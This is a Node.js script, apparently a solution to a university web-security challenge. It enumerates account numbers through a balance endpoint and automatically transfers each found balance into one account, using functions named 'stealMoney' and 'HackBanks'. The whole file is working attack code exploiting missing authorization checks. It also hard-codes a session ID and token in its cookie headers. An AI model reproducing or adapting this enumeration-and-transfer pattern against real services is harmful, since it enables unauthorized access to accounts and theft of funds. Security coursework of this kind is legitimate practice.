var https = require('https');



//The url we want is `www.nodejitsu.com:1337/`
var optionsGetBalance = {
  host: 'snickerboa.it.liu.se',
  path: '/challenges/1f0935baec6ba69d79cfb2eba5fdfa6ac5d77fadee08585eb98b130ec524d00cCurrentBalance',
  //This is what changes the request to a POST request
  method: 'POST',
  headers: {
    "Cookie": 'cc_cookie={"level":["necessary","analytics","vimeo"],"revision":0,"data":null,"rfc_cookie":false}; JSESSIONID=7E23ADF5AFF144D33289CBC92E25D49E; token=14959887813540883412001065811787704951',
    "Referer": "https://snickerboa.it.liu.se/challenges/1f0935baec6ba69d79cfb2eba5fdfa6ac5d77fadee08585eb98b130ec524d00c.jsp",
    "Origin": "https://snickerboa.it.liu.se",
    "Content-Type": "application/x-www-form-urlencoded"

  }
}

var optionsTransferMoney = {
  host: 'snickerboa.it.liu.se',
  path: '/challenges/1f0935baec6ba69d79cfb2eba5fdfa6ac5d77fadee08585eb98b130ec524d00cTransfer',
  //This is what changes the request to a POST request
  method: 'POST',
  headers: {
    "Cookie": 'cc_cookie={"level":["necessary","analytics","vimeo"],"revision":0,"data":null,"rfc_cookie":false}; JSESSIONID=7E23ADF5AFF144D33289CBC92E25D49E; token=14959887813540883412001065811787704951',
    "Referer": "https://snickerboa.it.liu.se/challenges/1f0935baec6ba69d79cfb2eba5fdfa6ac5d77fadee08585eb98b130ec524d00c.jsp",
    "Origin": "https://snickerboa.it.liu.se",
    "Content-Type": "application/x-www-form-urlencoded"

  }
}


var accountNumber = 0;
var timeout = 0;


const findBalance = (aNumber) => {


  var req = https.request(optionsGetBalance, async (response) => {
    var str = ''
    response.on('data', function (chunk) {
      str += chunk;
    });

    response.on('end', function () {

      if(aNumber === 1444)
      {
        console.log(`My balance \t ${str}`);
        console.log(`accountNumer is at ${accountNumber}`)
      }
      else if(str !== "An Error Occurred! You must be getting funky! Could not get Balance!"){
        console.log(`Account ${aNumber} balance is:\t ${str}`);
      }
      else {
        console.log(str);
        console.log(`Trying ${aNumber+1}`)
        timeout = 10;
      }

      if(str > 1 && aNumber != 1444)
      {
        stealMoney(str.substring(0,str.indexOf('.')),aNumber);
      }

      setTimeout(() => {
        
        findBalance(accountNumber++);
      }, timeout);

    });
  });
  //This is the data we are posting, it needs to be a string or a buffer
  req.write(`accountNumber=${aNumber}`);
  req.end();
}



const stealMoney = (ammount,aNumber) => {
  
  timeout = 1000;
  var req = https.request(optionsTransferMoney, (response) => {
    var str = ''
    response.on('data', function (chunk) {
      str += chunk;
    });
    
    response.on('end', function () {
      console.log(str);
      
      findBalance(1444);
    });
  });
  
  
  //This is the data we are posting, it needs to be a string or a buffer
  req.write(`senderAccountNumber=${aNumber}&recieverAccountNumber=1444&transferAmount=${ammount-1}`);
  req.end();
}

const HackBanks = () =>{
  findBalance(accountNumber);

}

module.exports = HackBanks;